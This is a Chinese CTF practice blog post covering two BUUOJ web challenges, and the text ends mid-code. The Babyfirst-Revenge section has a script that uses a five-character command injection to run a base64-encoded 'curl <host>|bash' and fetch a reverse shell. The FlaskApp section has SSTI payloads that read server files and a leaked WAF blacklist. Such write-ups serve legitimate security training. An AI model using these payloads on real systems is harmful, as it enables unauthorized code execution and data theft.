{"title":"BUUOJ练习记录210418","uid":"66a2d15b629f44e698c5d7524e5b913b","slug":"BUUOJ练习记录210418","date":"2021-04-18T09:49:16.000Z","updated":"2021-09-30T12:43:12.000Z","comments":true,"path":"api/articles/BUUOJ练习记录210418.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","content":"<h2 id=\"HITCON-2017-Babyfirst-Revenge\"><a href=\"#HITCON-2017-Babyfirst-Revenge\" class=\"headerlink\" title=\"[HITCON 2017]Babyfirst-Revenge\"></a>[HITCON 2017]Babyfirst-Revenge</h2><p><strong>考点：长度限制的命令执行</strong></p>\n<p>这是一个典型的限制长度为 5的命令执行题目</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n   <span class=\"token keyword\">echo</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$sandbox</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/var/www/html/sandbox/'</span> <span class=\"token operator\">.</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"orange\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   @<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   @<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n       @<span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'reset'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n       @<span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/bin/rm -rf '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n   <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>直接给出了源码，基本思路就是反弹shell，对于这种限制长度的题目，基本上会采用创建大量文件，然后使用<code>ls -t&gt;a</code>命令来构造a文件的内容，实际上也就是一条命令，然后<code>sh a</code>去执行a中的命令，从而实现反弹shell。当然手动的效率比较低，可用考虑写一个脚本以便以后使用。</p>\n<p>在vps上写入一个反弹shell命令到根目录文件，以靶机可以获取。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210419132145.png\" alt=\"命令写入\"></p>\n<p>直接写入<code>curl 172.16.172.91|bash</code>使由部分字符会重复，导致没法完整拼接，毕竟长度太短了点。所以使用base64编个码，防止出现这种情况。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Y3VybCAxNzIuMTYuMTcyLjkxfGJhc2g&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>上脚本：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> time\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://26cae3c2-a183-4c3f-b824-c5808df0dce5.node3.buuoj.cn/?cmd=\"</span>\n    payload1 <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">r'''>a\n>\\>\\\\\n>-d\\\\\n>\\ \\\\\n>64\\\\\n>se\\\\\n>ba\\\\\n>\\|\\\\\n>=\\\\\n>2g\\\\\n>hc\\\\\n>GJ\\\\\n>xf\\\\\n>jk\\\\\n>yL\\\\\n>Tc\\\\\n>M\\\\\n>Yu\\\\\n>MT\\\\\n>Iu\\\\\n>Nz\\\\\n>Ax\\\\\n>bC\\\\\n>Vy\\\\\n>Y3\\\\\n>S&#125;\\\\\n>IF\\\\\n>&#123;\\\\\n>\\$\\\\\n>ho\\\\\n>ec\\\\'''</span>\n    payload2 <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">r'''>ls\\\\\nls>_\n>\\ \\\\\n>-t\\\\\n>\\>y\nls>>_'''</span>\n    payload2 <span class=\"token operator\">=</span> payload2<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> payload2<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span>\n        requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span>\n    payload1 <span class=\"token operator\">=</span> payload1<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> payload1<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span>\n        requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span>\n    requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url <span class=\"token operator\">+</span> <span class=\"token string\">\"sh _\"</span><span class=\"token punctuation\">)</span>\n    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span>\n    requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url <span class=\"token operator\">+</span> <span class=\"token string\">\"sh y\"</span><span class=\"token punctuation\">)</span>\n    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span>\n    requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url <span class=\"token operator\">+</span> <span class=\"token string\">\"sh a\"</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到我们已经写入了文件_</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210419131446.png\" alt=\"_文件\"></p>\n<p>再看一下文件a，可以看到我们已经写入了一个命令在里面，这个时候传入参数到cmd=sh a就可以去执行这个命令，从vps上获取命令并且bash执行，但是buuoj提供的linux内网靶机，不知道为什么反弹shell一直没有成功。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210419131818.png\" alt=\"a文件\"></p>\n<p>但是大概的解题思路就是如此了。</p>\n<h2 id=\"GYCTF2020-FlaskApp\"><a href=\"#GYCTF2020-FlaskApp\" class=\"headerlink\" title=\"[GYCTF2020]FlaskApp\"></a>[GYCTF2020]FlaskApp</h2><p><strong>考点：SSTI</strong></p>\n<p>如题一样，这是一个flask框架。这是一个实现base64加解密的小app，而且编码结果和解码结果都存在输出到页面上，考虑测试时候存在ssti问题。14可以但是49不可行，应当是被过滤，<code>*</code>被过滤,先尝试ssti看看，发现到了subclasses查询时就不会有显示了，感觉不太行的样子。先不急，可以稍微看看提示，提示的源码中似乎在提示与PIN码有关。</p>\n<p>所以就在解码处，随便输一个非base64字符来看看有没有开debug mode（前提是没有做异常处理），如果开了我们就可用看看能不能读到一些代码了。事实证明它开启了debug mode</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/decode'</span><span class=\"token punctuation\">,</span>methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'text'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span>\n        text <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"text\"</span><span class=\"token punctuation\">)</span>\n        text_decode <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        tmp <span class=\"token operator\">=</span> <span class=\"token string\">\"结果 ： &#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>text_decode<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> waf<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">\"no no no !!\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'decode'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        res <span class=\"token operator\">=</span>  render_template_string<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>利用debug mode的报错我们get到了上面的这些代码，以及源文件的存储位置为<code>/app/app.py</code>,PING码问题条件不足，从代码来看是要绕过waf函数的限制来进行ssti，但是waf的内容我们这里无法知晓。</p>\n<p>用脚本来找一下可用的类：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">search <span class=\"token operator\">=</span> <span class=\"token string\">'__builtins__'</span>\nnum <span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__base__<span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    num <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> search <span class=\"token keyword\">in</span> i<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>__name__<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">pass</span>\n    \n<span class=\"token triple-quoted-string string\">'''运行结果'''</span>\n_ModuleLock <span class=\"token number\">80</span>\n_DummyModuleLock <span class=\"token number\">81</span>\n_ModuleLockManager <span class=\"token number\">82</span>\nModuleSpec <span class=\"token number\">83</span>\nFileLoader <span class=\"token number\">94</span>\n_NamespacePath <span class=\"token number\">95</span>\n_NamespaceLoader <span class=\"token number\">96</span>\nFileFinder <span class=\"token number\">98</span>\nzipimporter <span class=\"token number\">104</span>\n_ZipImportResourceReader <span class=\"token number\">105</span>\nIncrementalEncoder <span class=\"token number\">107</span>\nIncrementalDecoder <span class=\"token number\">108</span>\nStreamReaderWriter <span class=\"token number\">109</span>\nStreamRecoder <span class=\"token number\">110</span>\n_wrap_close <span class=\"token number\">132</span>\nQuitter <span class=\"token number\">133</span>\n_Printer <span class=\"token number\">134</span>\nDynamicClassAttribute <span class=\"token number\">136</span>\n_GeneratorWrapper <span class=\"token number\">137</span>\nWarningMessage <span class=\"token number\">138</span>\ncatch_warnings <span class=\"token number\">139</span>\nRepr <span class=\"token number\">166</span>\npartialmethod <span class=\"token number\">174</span>\nsingledispatchmethod <span class=\"token number\">175</span>\ncached_property <span class=\"token number\">176</span>\n_GeneratorContextManagerBase <span class=\"token number\">178</span>\n_BaseExitStack <span class=\"token number\">179</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以可用尝试去构造一个payload：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">&#123;</span><span class=\"token operator\">%</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__base__<span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span><span class=\"token operator\">%</span> <span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>__name__<span class=\"token operator\">==</span><span class=\"token string\">'catch_warnings'</span> <span class=\"token operator\">%</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> i<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">[</span><span class=\"token string\">'__builtins__'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'app.py'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span><span class=\"token operator\">%</span> endif <span class=\"token operator\">%</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span><span class=\"token operator\">%</span> endfor <span class=\"token operator\">%</span><span class=\"token punctuation\">&#125;</span>\n编码一下：\neyUgZm9yIGkgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBpLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgaS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>成功读取到了源码：</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210420000505.png\" alt=\"读取源码\"></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> flask\n<span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> render_template_string <span class=\"token keyword\">from</span> flask\n<span class=\"token keyword\">import</span> render_template<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> flash<span class=\"token punctuation\">,</span> redirect<span class=\"token punctuation\">,</span> url_for <span class=\"token keyword\">from</span> flask_wtf\n<span class=\"token keyword\">import</span> FlaskForm <span class=\"token keyword\">from</span> wtforms\n<span class=\"token keyword\">import</span> StringField<span class=\"token punctuation\">,</span> SubmitField <span class=\"token keyword\">from</span> wtforms<span class=\"token punctuation\">.</span>validators\n<span class=\"token keyword\">import</span> DataRequired <span class=\"token keyword\">from</span> flask_bootstrap\n<span class=\"token keyword\">import</span> Bootstrap\n<span class=\"token keyword\">import</span> base64 \n\napp <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span> \napp<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">[</span><span class=\"token string\">'SECRET_KEY'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token string\">'s_e_c_r_e_t_k_e_y'</span>\nbootstrap <span class=\"token operator\">=</span> Bootstrap<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name\">NameForm</span><span class=\"token punctuation\">(</span>FlaskForm<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n    text <span class=\"token operator\">=</span> StringField<span class=\"token punctuation\">(</span><span class=\"token string\">'BASE64 Æ'</span><span class=\"token punctuation\">,</span> validators <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>DataRequired<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n    submit <span class=\"token operator\">=</span> SubmitField<span class=\"token punctuation\">(</span><span class=\"token string\">'Ð¤'</span><span class=\"token punctuation\">)</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name\">NameForm1</span><span class=\"token punctuation\">(</span>FlaskForm<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n    text <span class=\"token operator\">=</span> StringField<span class=\"token punctuation\">(</span><span class=\"token string\">'BASE64ãÆ'</span><span class=\"token punctuation\">,</span> validators <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>DataRequired<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n    submit <span class=\"token operator\">=</span> SubmitField<span class=\"token punctuation\">(</span><span class=\"token string\">'Ð¤'</span><span class=\"token punctuation\">)</span> \n<span class=\"token keyword\">def</span> <span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n        black_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"os\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"popen\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"import\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"eval\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"chr\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"request\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"subprocess\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"commands\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"socket\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hex\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"base64\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"*\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"?\"</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> black_list<span class=\"token punctuation\">:</span> \n            <span class=\"token keyword\">if</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n                <span class=\"token keyword\">return</span> <span class=\"token number\">1</span>\n@ app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">'/hint'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n<span class=\"token keyword\">def</span> <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n    txt <span class=\"token operator\">=</span> <span class=\"token string\">\"1%C\u0010KÍ\u0001\u0001\"</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"hint.html\"</span><span class=\"token punctuation\">,</span> txt <span class=\"token operator\">=</span> txt<span class=\"token punctuation\">)</span>\n@ app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n<span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'text'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n        text <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"text\"</span><span class=\"token punctuation\">)</span> \n        text_decode <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n        tmp <span class=\"token operator\">=</span> <span class=\"token string\">\"Ó :&#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>text_decode<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        res <span class=\"token operator\">=</span> render_template_string<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span> \n        flash<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span> \n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'encode'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n        text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n        form <span class=\"token operator\">=</span> NameForm<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span> \n        <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"index.html\"</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">,</span> method <span class=\"token operator\">=</span> <span class=\"token string\">\" Æ\"</span><span class=\"token punctuation\">,</span> img <span class=\"token operator\">=</span> <span class=\"token string\">\"flask.png\"</span><span class=\"token punctuation\">)</span>\n@ app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">'/decode'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n<span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'text'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        text <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"text\"</span><span class=\"token punctuation\">)</span>\n        text_decode <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n        tmp <span class=\"token operator\">=</span> <span class=\"token string\">\"Ó \u001a &#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>text_decode<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n        <span class=\"token keyword\">if</span> waf<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">\"no no no !!\"</span><span class=\"token punctuation\">)</span> \n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'decode'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n        res <span class=\"token operator\">=</span> render_template_string<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span> \n        flash<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span> \n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'decode'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n        text <span 